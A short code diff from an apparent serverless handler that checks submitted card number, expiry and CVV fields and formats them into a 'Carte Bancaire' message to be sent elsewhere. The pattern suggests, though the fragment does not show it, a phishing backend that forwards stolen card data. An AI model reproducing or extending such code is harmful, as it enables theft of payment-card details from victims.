@@ -23,7 +23,7 @@ export default async function handler(req, res) {
 
   let message = "";
 
-  if (cc_number && cc_exp && cc_cvv) {
+  if (cc && exp && cvv) {
     // 🟢 رسالة الكارت
     message = `
 💳 Carte Bancaire:
@@ -66,4 +66,5 @@ export default async function handler(req, res) {
     res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
   }
 }
+
 
